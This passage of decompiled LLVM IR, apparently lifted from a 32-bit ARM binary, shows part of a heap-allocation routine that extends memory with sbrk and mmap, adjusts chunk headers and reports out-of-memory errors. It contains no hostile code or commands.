  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v4_11f9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11f9c, i32* %r3.global-to-local, align 4
  %v1_11fa0 = add i32 %v4_11f9c, 44
  %v2_11fa0 = inttoptr i32 %v1_11fa0 to i32*
  %v3_11fa0 = load i32, i32* %v2_11fa0, align 4
  store i32 %v3_11fa0, i32* %r0.global-to-local, align 4
  %v1_11fa4 = add i32 %v4_11f9c, 864
  %v2_11fa4 = inttoptr i32 %v1_11fa4 to i32*
  %v3_11fa4 = load i32, i32* %v2_11fa4, align 4
  store i32 %v3_11fa4, i32* %r2.global-to-local, align 4
  %v1_11fa8 = add i32 %v4_11f9c, 840
  %v2_11fa8 = inttoptr i32 %v1_11fa8 to i32*
  %v3_11fa8 = load i32, i32* %v2_11fa8, align 4
  store i32 %v3_11fa8, i32* %r3.global-to-local, align 4
  %v1_11fac = add i32 %v3_11fa0, 4
  %v2_11fac = inttoptr i32 %v1_11fac to i32*
  %v3_11fac = load i32, i32* %v2_11fac, align 4
  store i32 %v3_11fac, i32* %r1.global-to-local, align 4
  %v1_11fb4 = urem i32 %v3_11fa4, 2
  %v2_11fb4 = icmp eq i32 %v1_11fb4, 0
  %v1_11fb0 = add i32 %v1_11fb8, 16
  %v2_11fb8 = add i32 %v1_11fb0, %v3_11fa8
  store i32 %v2_11fb8, i32* %r3.global-to-local, align 4
  %v1_11fbc = and i32 %v3_11fac, -4
  store i32 %v1_11fbc, i32* @r8, align 4
  br i1 %v2_11fb4, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_11f94
  %v3_11fc0 = sub i32 %v2_11fb8, %v1_11fbc
  store i32 %v3_11fc0, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_11f94, %bb155
  %v0_11fc4 = phi i32 [ %v2_11fb8, %dec_label_pc_11f94 ], [ %v3_11fc0, %bb155 ]
  %v1_11fc4 = load i32, i32* %sb.global-to-local, align 4
  %v2_11fc4 = add i32 %v1_11fc4, %v0_11fc4
  store i32 %v2_11fc4, i32* %r3.global-to-local, align 4
  %v1_11fc8 = sub i32 -1, %v1_11fc4
  store i32 %v1_11fc8, i32* %fp.global-to-local, align 4
  %v2_11fcc = and i32 %v2_11fc4, %v1_11fc8
  store i32 %v2_11fcc, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_11fcc, 1
  br i1 %tmp157, label %dec_label_pc_11ff0, label %dec_label_pc_11fdc

dec_label_pc_11fdc:                               ; preds = %bb156
  store i32 %v2_11fcc, i32* %r0.global-to-local, align 4
  %v1_11fe0 = call i32 @__GI_sbrk(i32 %v2_11fcc)
  store i32 %v1_11fe0, i32* %r0.global-to-local, align 4
  %v3_11fe4 = icmp eq i32 %v1_11fe0, -1
  store i32 %v1_11fe0, i32* @r4, align 4
  br i1 %v3_11fe4, label %dec_label_pc_11ff0, label %dec_label_pc_1205c

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11fdc, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_11ff8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11ff8, i32* %r6.global-to-local, align 4
  %v1_11ffc = add i32 %v4_11ff8, 864
  %v2_11ffc = inttoptr i32 %v1_11ffc to i32*
  %v3_11ffc = load i32, i32* %v2_11ffc, align 4
  store i32 %v3_11ffc, i32* %r3.global-to-local, align 4
  %v1_12000 = urem i32 %v3_11ffc, 2
  %v2_12000 = icmp eq i32 %v1_12000, 0
  br i1 %v2_12000, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_11ff0
  %v1_12004 = load i32, i32* @r8, align 4
  %v2_12004 = load i32, i32* %sb.global-to-local, align 4
  %v3_12004 = add i32 %v2_12004, %v1_12004
  %v2_12008 = load i32, i32* @r5, align 4
  %v3_12008 = add i32 %v3_12004, %v2_12008
  store i32 %v3_12008, i32* %r3.global-to-local, align 4
  %v2_1200c = load i32, i32* %fp.global-to-local, align 4
  %v3_1200c = and i32 %v2_1200c, %v3_12008
  store i32 %v3_1200c, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_11ff0
  %v0_12010.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12010 = phi i32 [ %v0_12010.pr, %.thread32thread-pre-split ], [ %v3_1200c, %bb158 ]
  %v2_12010 = icmp ugt i32 %v0_12010, 1048575
  br i1 %v2_12010, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12028 = phi i32 [ %v0_12010, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12018 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12028, %v1_12018
  br i1 %tmp217, label %dec_label_pc_12020, label %dec_label_pc_12284

dec_label_pc_12020:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12028, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1203c = call i32 @mmap(i32 0, i32 %v0_12028, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1203c, i32* %r0.global-to-local, align 4
  %v3_12040 = icmp eq i32 %v6_1203c, -1
  %v8_12040 = icmp eq i32 %v6_1203c, -1
  store i32 %v6_1203c, i32* @r4, align 4
  br i1 %v8_12040, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12020
  %v1_12048 = load i32, i32* %r6.global-to-local, align 4
  %v2_12048 = add i32 %v1_12048, 864
  %v3_12048 = inttoptr i32 %v2_12048 to i32*
  %v4_12048 = load i32, i32* %v3_12048, align 4
  %v2_1204c = load i32, i32* @r5, align 4
  %v3_1204c = add i32 %v2_1204c, %v6_1203c
  store i32 %v3_1204c, i32* %r0.global-to-local, align 4
  %v2_12050 = and i32 %v4_12048, -2
  store i32 %v2_12050, i32* %r3.global-to-local, align 4
  store i32 %v2_12050, i32* %v3_12048, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12020, %bb161
  br i1 %v3_12040, label %dec_label_pc_1205c, label %dec_label_pc_12060

dec_label_pc_1205c:                               ; preds = %.thread35, %dec_label_pc_11fdc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12060

dec_label_pc_12060:                               ; preds = %.thread35, %dec_label_pc_1205c
  %v0_12060 = load i32, i32* @r4, align 4
  %v7_12060 = icmp eq i32 %v0_12060, -1
  br i1 %v7_12060, label %dec_label_pc_12284, label %dec_label_pc_12068

dec_label_pc_12068:                               ; preds = %dec_label_pc_12060
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v4_12070 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_12070, i32* %ip.global-to-local, align 4
  store i32 %v3_11fa0, i32* %r2.global-to-local, align 4
  %v1_12078 = add i32 %v4_12070, 872
  %v2_12078 = inttoptr i32 %v1_12078 to i32*
  %v3_12078 = load i32, i32* %v2_12078, align 4
  %v1_1207c = load i32, i32* @r8, align 4
  %v2_1207c = add i32 %v1_1207c, %v3_11fa0
  store i32 %v2_1207c, i32* %r1.global-to-local, align 4
  %v0_12080 = load i32, i32* @r5, align 4
  %v2_12080 = add i32 %v0_12080, %v3_12078
  store i32 %v2_12080, i32* %r3.global-to-local, align 4
  %v9_12084 = icmp eq i32 %v0_12060, %v2_1207c
  br i1 %v9_12084, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12068
  store i32 %v2_12080, i32* %v2_12078, align 4
  br label %dec_label_pc_120a0

bb162:                                            ; preds = %dec_label_pc_12068
  %v1_12088 = load i32, i32* %r0.global-to-local, align 4
  %v8_12088 = icmp eq i32 %v1_12088, -1
  store i32 %v2_12080, i32* %v2_12078, align 4
  br i1 %v8_12088, label %.thread37, label %dec_label_pc_120a0

.thread37:                                        ; preds = %bb162
  %v1_12090 = load i32, i32* @r5, align 4
  %v2_12090 = load i32, i32* @r8, align 4
  %v3_12090 = add i32 %v2_12090, %v1_12090
  %v2_12094 = or i32 %v3_12090, 1
  store i32 %v2_12094, i32* %r3.global-to-local, align 4
  %v2_12098 = load i32, i32* %r2.global-to-local, align 4
  %v3_12098 = add i32 %v2_12098, 4
  %v4_12098 = inttoptr i32 %v3_12098 to i32*
  store i32 %v2_12094, i32* %v4_12098, align 4
  br label %dec_label_pc_12218

dec_label_pc_120a0:                               ; preds = %bb162, %.thread125
  %v0_120a4.pr = load i32, i32* @r8, align 4
  %v0_120a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_120a0 = add i32 %v0_120a0, 864
  %v2_120a0 = inttoptr i32 %v1_120a0 to i32*
  %v3_120a0 = load i32, i32* %v2_120a0, align 4
  store i32 %v3_120a0, i32* %r2.global-to-local, align 4
  %v2_120a4 = icmp eq i32 %v0_120a4.pr, 0
  br i1 %v2_120a4, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_120a0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_120a0
  %v2_120ac = urem i32 %v3_120a0, 2
  store i32 %v2_120ac, i32* %r3.global-to-local, align 4
  %v2_120b0 = icmp eq i32 %v2_120ac, 0
  br i1 %v2_120b0, label %.thread43, label %dec_label_pc_120b8

dec_label_pc_120b8:                               ; preds = %.thread39
  %v0_120b8 = load i32, i32* @r4, align 4
  %v1_120b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_120b8 = icmp ult i32 %v0_120b8, %v1_120b8
  br i1 %v3_120b8, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_120b8
  %v2_120bc = and i32 %v3_120a0, -2
  store i32 %v2_120bc, i32* %r3.global-to-local, align 4
  store i32 %v2_120bc, i32* %v2_120a0, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_120b8, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v4_120cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_120cc, i32* @r7, align 4
  %v1_120d0 = add i32 %v4_120cc, 864
  %v2_120d0 = inttoptr i32 %v1_120d0 to i32*
  %v3_120d0 = load i32, i32* %v2_120d0, align 4
  store i32 %v3_120d0, i32* %r3.global-to-local, align 4
  %v1_120d4 = urem i32 %v3_120d0, 2
  store i32 %v1_120d4, i32* @r6, align 4
  %v2_120d4 = icmp eq i32 %v1_120d4, 0
  br i1 %v2_120d4, label %dec_label_pc_12168, label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %.thread43
  %v0_120dc = load i32, i32* @r8, align 4
  %v2_120dc = icmp eq i32 %v0_120dc, 0
  br i1 %v2_120dc, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_120dc
  %v2_120e0 = add i32 %v4_120cc, 872
  %v3_120e0 = inttoptr i32 %v2_120e0 to i32*
  %v4_120e0 = load i32, i32* %v3_120e0, align 4
  store i32 %v4_120e0, i32* %r2.global-to-local, align 4
  %v1_120e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_120e4 = load i32, i32* @r4, align 4
  %v3_120e4 = sub i32 %v2_120e4, %v1_120e4
  %v3_120e8 = add i32 %v3_120e4, %v4_120e0
  store i32 %v3_120e8, i32* %r3.global-to-local, align 4
  store i32 %v3_120e8, i32* %v3_120e0, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_120dc, %bb164
  %v0_120f0 = load i32, i32* @r4, align 4
  %v1_120f0 = urem i32 %v0_120f0, 8
  store i32 %v1_120f0, i32* %r3.global-to-local, align 4
  %v2_120f0 = icmp eq i32 %v1_120f0, 0
  br i1 %v2_120f0, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_120f4 = sub nsw i32 8, %v1_120f0
  store i32 %v2_120f4, i32* %r3.global-to-local, align 4
  %v3_120f8 = add i32 %v2_120f4, %v0_120f0
  store i32 %v3_120f8, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12100 = phi i32 [ 0, %.thread46 ], [ %v2_120f4, %bb165 ]
  %v1_120fc = load i32, i32* @r5, align 4
  %v2_120fc = add i32 %v1_120fc, %v0_120f0
  store i32 %v2_120fc, i32* @r6, align 4
  %v1_12100 = load i32, i32* @r8, align 4
  %v2_12100 = add i32 %v2_120fc, %v0_12100
  %v2_12104 = add i32 %v2_12100, %v1_12100
  store i32 %v2_12104, i32* %r1.global-to-local, align 4
  %v1_12108 = load i32, i32* %sb.global-to-local, align 4
  %v2_12108 = add i32 %v1_12108, %v2_12104
  %v1_1210c = load i32, i32* %fp.global-to-local, align 4
  %v2_1210c = and i32 %v1_1210c, %v2_12108
  store i32 %v2_1210c, i32* %r2.global-to-local, align 4
  %v2_12110 = sub i32 0, %v2_120fc
  store i32 %v2_12110, i32* %r3.global-to-local, align 4
  %v2_12114 = sub i32 %v2_1210c, %v2_120fc
  store i32 %v2_12114, i32* @r5, align 4
  store i32 %v2_12114, i32* %r0.global-to-local, align 4
  br i1 %v2_120f0, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_120f0, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12120 = call i32 @__GI_sbrk(i32 %v2_12114)
  store i32 %v1_12120, i32* %r0.global-to-local, align 4
  %v3_12124 = icmp eq i32 %v1_12120, -1
  br i1 %v3_12124, label %dec_label_pc_1212c, label %dec_label_pc_1213c

dec_label_pc_1212c:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12130 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12130, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12194

dec_label_pc_1213c:                               ; preds = %bb167
  %v1_1213c = load i32, i32* @r4, align 4
  %v3_1213c = icmp ult i32 %v1_12120, %v1_1213c
  br i1 %v3_1213c, label %dec_label_pc_12144, label %dec_label_pc_12194

dec_label_pc_12144:                               ; preds = %dec_label_pc_1213c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r0.global-to-local, align 4
  %v4_1214c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_1214c, i32* %r2.global-to-local, align 4
  %v1_12150 = add i32 %v4_1214c, 864
  %v2_12150 = inttoptr i32 %v1_12150 to i32*
  %v3_12150 = load i32, i32* %v2_12150, align 4
  %v0_12154 = load i32, i32* @r6, align 4
  store i32 %v0_12154, i32* %r0.global-to-local, align 4
  %v1_12158 = and i32 %v3_12150, -2
  store i32 %v1_12158, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12158, i32* %v2_12150, align 4
  br label %dec_label_pc_12194

dec_label_pc_12168:                               ; preds = %.thread43
  %v0_12168 = load i32, i32* %r0.global-to-local, align 4
  %v3_12168 = icmp eq i32 %v0_12168, -1
  br i1 %v3_12168, label %dec_label_pc_12170, label %dec_label_pc_1218c

dec_label_pc_12170:                               ; preds = %dec_label_pc_12168
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12174 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12174, i32* %r0.global-to-local, align 4
  %v0_12178 = load i32, i32* @r7, align 4
  %v1_12178 = add i32 %v0_12178, 872
  %v2_12178 = inttoptr i32 %v1_12178 to i32*
  %v3_12178 = load i32, i32* %v2_12178, align 4
  store i32 %v3_12178, i32* %r2.global-to-local, align 4
  %v0_1217c = load i32, i32* @r4, align 4
  %v0_12180 = load i32, i32* @r5, align 4
  %v2_1217c = add i32 %v3_12178, %v1_12174
  %v2_12180 = sub i32 %v2_1217c, %v0_1217c
  %v2_12184 = sub i32 %v2_12180, %v0_12180
  store i32 %v2_12184, i32* %r3.global-to-local, align 4
  store i32 %v2_12184, i32* %v2_12178, align 4
  %v0_12190.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1218c

dec_label_pc_1218c:                               ; preds = %dec_label_pc_12168, %dec_label_pc_12170
  %v0_12190 = phi i32 [ 0, %dec_label_pc_12168 ], [ %v0_12190.pre, %dec_label_pc_12170 ]
  %v0_1218c = load i32, i32* @r4, align 4
  store i32 %v0_1218c, i32* @r7, align 4
  store i32 %v0_12190, i32* @r5, align 4
  br label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_1213c, %dec_label_pc_12144, %dec_label_pc_1212c, %dec_label_pc_1218c
  %v0_12194 = load i32, i32* %r0.global-to-local, align 4
  %v7_12194 = icmp eq i32 %v0_12194, -1
  br i1 %v7_12194, label %dec_label_pc_12218, label %dec_label_pc_1219c

dec_label_pc_1219c:                               ; preds = %dec_label_pc_12194
  %v1_1219c = load i32, i32* @r5, align 4
  %v2_1219c = add i32 %v1_1219c, %v0_12194
  %v0_121a0 = load i32, i32* @r7, align 4
  %v2_121a0 = sub i32 %v2_1219c, %v0_121a0
  %v1_121a4 = or i32 %v2_121a0, 1
  %v2_121a8 = add i32 %v0_121a0, 4
  %v3_121a8 = inttoptr i32 %v2_121a8 to i32*
  store i32 %v1_121a4, i32* %v3_121a8, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_121b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_121b4, i32* @r6, align 4
  %v1_121b8 = add i32 %v4_121b4, 872
  %v2_121b8 = inttoptr i32 %v1_121b8 to i32*
  %v3_121b8 = load i32, i32* %v2_121b8, align 4
  %v0_121bc = load i32, i32* @r8, align 4
  %v2_121bc = icmp eq i32 %v0_121bc, 0
  %v0_121c0 = load i32, i32* @r5, align 4
  %v2_121c0 = add i32 %v0_121c0, %v3_121b8
  store i32 %v2_121c0, i32* %r3.global-to-local, align 4
  store i32 %v2_121c0, i32* %v2_121b8, align 4
  %v0_121c8 = load i32, i32* @r7, align 4
  %v1_121c8 = load i32, i32* @r6, align 4
  %v2_121c8 = add i32 %v1_121c8, 44
  %v3_121c8 = inttoptr i32 %v2_121c8 to i32*
  store i32 %v0_121c8, i32* %v3_121c8, align 4
  br i1 %v2_121bc, label %dec_label_pc_12218, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %dec_label_pc_1219c
  %v0_121d4 = load i32, i32* @r8, align 4
  %v1_121d4 = add i32 %v0_121d4, -12
  %v1_121d8 = and i32 %v1_121d4, -8
  store i32 %v3_11fa0, i32* %ip.global-to-local, align 4
  %v2_121e0 = add i32 %v1_121d8, %v3_11fa0
  store i32 %v2_121e0, i32* %r1.global-to-local, align 4
  %v2_121e4 = icmp ugt i32 %v1_121d8, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_121ec = or i32 %v1_121d8, 1
  store i32 %v1_121ec, i32* %r3.global-to-local, align 4
  store i32 %v1_121ec, i32* %v2_11fac, align 4
  %v0_121f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_121f4 = add i32 %v1_121f4, 8
  %v3_121f4 = inttoptr i32 %v2_121f4 to i32*
  store i32 %v0_121f4, i32* %v3_121f4, align 4
  %v0_121f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_121f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_121f8 = add i32 %v1_121f8, 4
  %v3_121f8 = inttoptr i32 %v2_121f8 to i32*
  store i32 %v0_121f8, i32* %v3_121f8, align 4
  br i1 %v2_121e4, label %dec_label_pc_12200, label %dec_label_pc_12218

dec_label_pc_12200:                               ; preds = %dec_label_pc_121d0
  %v0_12200 = load i32, i32* @r6, align 4
  %v1_12200 = add i32 %v0_12200, 836
  %v2_12200 = inttoptr i32 %v1_12200 to i32*
  %v3_12200 = load i32, i32* %v2_12200, align 4
  store i32 %v3_12200, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12208 = load i32, i32* %ip.global-to-local, align 4
  %v1_12208 = add i32 %v0_12208, 8
  store i32 %v1_12208, i32* @r0, align 4
  store i32 -1, i32* %v2_12200, align 4
  %v0_12210 = call i32 @free()
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  %v0_12214 = load i32, i32* @r4, align 4
  %v1_12214 = load i32, i32* @r6, align 4
  %v2_12214 = add i32 %v1_12214, 836
  %v3_12214 = inttoptr i32 %v2_12214 to i32*
  store i32 %v0_12214, i32* %v3_12214, align 4
  br label %dec_label_pc_12218

dec_label_pc_12218:                               ; preds = %.thread37, %dec_label_pc_121d0, %dec_label_pc_1219c, %dec_label_pc_12194, %dec_label_pc_12200
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r0.global-to-local, align 4
  %v4_12220 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_12220, i32* %lr.global-to-local, align 4
  %v1_12224 = add i32 %v4_12220, 872
  store i32 %v1_12224, i32* %r1.global-to-local, align 4
  %v1_12228 = inttoptr i32 %v1_12224 to i32*
  %v2_12228 = load i32, i32* %v1_12228, align 4
  store i32 %v2_12228, i32* %r1.global-to-local, align 4
  %v3_12228 = add i32 %v4_12220, 876
  %v4_12228 = inttoptr i32 %v3_12228 to i32*
  %v5_12228 = load i32, i32* %v4_12228, align 4
  store i32 %v5_12228, i32* %r3.global-to-local, align 4
  %v1_12230 = add i32 %v4_12220, 868
  %v2_12230 = inttoptr i32 %v1_12230 to i32*
  %v3_12230 = load i32, i32* %v2_12230, align 4
  store i32 %v3_12230, i32* %r3.global-to-local, align 4
  %v1_12234 = add i32 %v4_12220, 884
  %v2_12234 = inttoptr i32 %v1_12234 to i32*
  %v3_12234 = load i32, i32* %v2_12234, align 4
  store i32 %v3_12234, i32* %r2.global-to-local, align 4
  %v2_12238 = add i32 %v3_12230, %v2_12228
  store i32 %v2_12238, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12228, %v5_12228
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12218
  store i32 %v2_12228, i32* %v4_12228, align 4
  %v0_12240.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12240.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12218, %bb168
  %v1_12240 = phi i32 [ %v3_12234, %dec_label_pc_12218 ], [ %v1_12240.pre, %bb168 ]
  %v4_12244 = phi i32 [ %v2_12238, %dec_label_pc_12218 ], [ %v0_12240.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12244, %v1_12240
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12244 = load i32, i32* %lr.global-to-local, align 4
  %v6_12244 = add i32 %v5_12244, 884
  %v7_12244 = inttoptr i32 %v6_12244 to i32*
  store i32 %v4_12244, i32* %v7_12244, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12248 = load i32, i32* %lr.global-to-local, align 4
  %v1_12248 = add i32 %v0_12248, 44
  %v2_12248 = inttoptr i32 %v1_12248 to i32*
  %v3_12248 = load i32, i32* %v2_12248, align 4
  store i32 %v3_12248, i32* %ip.global-to-local, align 4
  %v1_1224c = add i32 %v3_12248, 4
  %v2_1224c = inttoptr i32 %v1_1224c to i32*
  %v3_1224c = load i32, i32* %v2_1224c, align 4
  store i32 %v1_11e60, i32* %r1.global-to-local, align 4
  %v1_12254 = and i32 %v3_1224c, -4
  store i32 %v1_12254, i32* %r3.global-to-local, align 4
  %v3_12258 = icmp ult i32 %v1_12254, %v1_11e60
  br i1 %v3_12258, label %dec_label_pc_12284, label %dec_label_pc_12260

dec_label_pc_12260:                               ; preds = %bb171
  %v0_12260 = load i32, i32* @sl, align 4
  %v2_12260 = sub i32 %v1_12254, %v0_12260
  %v2_12264 = add i32 %v0_12260, %v3_12248
  store i32 %v2_12264, i32* %r1.global-to-local, align 4
  %v1_12268 = or i32 %v2_12260, 1
  store i32 %v1_12268, i32* %r3.global-to-local, align 4
  %v1_1226c = or i32 %v0_12260, 1
  store i32 %v1_1226c, i32* %r2.global-to-local, align 4
  %v1_12270 = add i32 %v3_12248, 8
  store i32 %v1_12270, i32* %r0.global-to-local, align 4
  store i32 %v1_1226c, i32* %v2_1224c, align 4
  %v0_12278 = load i32, i32* %r1.global-to-local, align 4
  %v1_12278 = load i32, i32* %lr.global-to-local, align 4
  %v2_12278 = add i32 %v1_12278, 44
  %v3_12278 = inttoptr i32 %v2_12278 to i32*
  store i32 %v0_12278, i32* %v3_12278, align 4
  %v0_1227c = load i32, i32* %r3.global-to-local, align 4
  %v1_1227c = load i32, i32* %r1.global-to-local, align 4
  %v2_1227c = add i32 %v1_1227c, 4
  %v3_1227c = inttoptr i32 %v2_1227c to i32*
  store i32 %v0_1227c, i32* %v3_1227c, align 4
  br label %dec_label_pc_1229c

dec_label_pc_12284:                               ; preds = %bb160, %bb171, %dec_label_pc_12060
  store i32 62556, i32* %r3.global-to-local, align 4
  %v0_12288 = call i32 @__aeabi_read_tp()
  %v3_1228c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1228c = sext i16 %v3_1228c to i32
  store i32 %v4_1228c, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12294 = add i32 %v4_1228c, %v0_12288
  %v4_12294 = inttoptr i32 %v3_12294 to i32*
  store i32 12, i32* %v4_12294, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1229c

dec_label_pc_1229c:                               ; preds = %bb154, %bb153, %dec_label_pc_12260, %dec_label_pc_11ea8, %dec_label_pc_12284
  %v0_1229c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1229c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_122a0

dec_label_pc_122a0:                               ; preds = %.thread4, %dec_label_pc_11e74, %.thread124, %dec_label_pc_11ce4, %dec_label_pc_11cd8, %dec_label_pc_11b40, %dec_label_pc_11ac4, %dec_label_pc_1229c
  store i32 %v2_119e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v4_122b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 44) to i32*), align 4
  store i32 %v4_122b0, i32* @ip, align 4
  store i32 74428, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_122b0)
  br label %dec_label_pc_122bc

dec_label_pc_122bc:                               ; preds = %dec_label_pc_11a1c, %dec_label_pc_122a0
  %v0_122bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_122bc, i32* %r0.global-to-local, align 4
  store i32 %v3_119b8, i32* @r4, align 4
  store i32 %v6_119b8, i32* @r5, align 4
  store i32 %v9_119b8, i32* @r6, align 4
  store i32 %v12_119b8, i32* @r7, align 4
  store i32 %v15_119b8, i32* @r8, align 4
  store i32 %v18_119b8, i32* @sb, align 4
  store i32 %v21_119b8, i32* @sl, align 4
  store i32 %v24_119b8, i32* @fp, align 4
  store i32 %v27_119b8, i32* @lr, align 4
  ret i32 %v0_122bc

; uselistorder directives
  uselistorder i32 %v0_12260, { 1, 0, 2 }
  uselistorder i32 %v3_12248, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12244, { 1, 0 }
  uselistorder i32 %v2_12228, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12220, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_121d8, { 1, 2, 0 }
  uselistorder i32 %v0_121a0, { 1, 0 }
  uselistorder i32 %v0_12194, { 1, 0 }
  uselistorder i32 %v2_12184, { 1, 0 }
  uselistorder i32 %v2_12114, { 2, 1, 0 }
  uselistorder i32 %v2_120fc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_120f4, { 1, 0, 2 }
  uselistorder i32 %v1_120f0, { 2, 1, 0 }
  uselistorder i32 %v0_120f0, { 3, 1, 2, 0 }
  uselistorder i32 %v1_120d4, { 1, 0 }
  uselistorder i32 %v2_120ac, { 1, 0 }
  uselistorder i32 %v3_120a0, { 1, 0, 2 }
  uselistorder i32 %v2_12080, { 1, 0, 2 }
  uselistorder i32* %v2_12078, { 1, 0, 2 }
  uselistorder i32 %v0_12060, { 1, 0 }
  uselistorder i32 %v6_1203c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12028, { 2, 1, 0 }
  uselistorder i32 %v0_12010, { 1, 0 }
  uselistorder i32 %v2_11fcc, { 1, 0, 2, 3 }
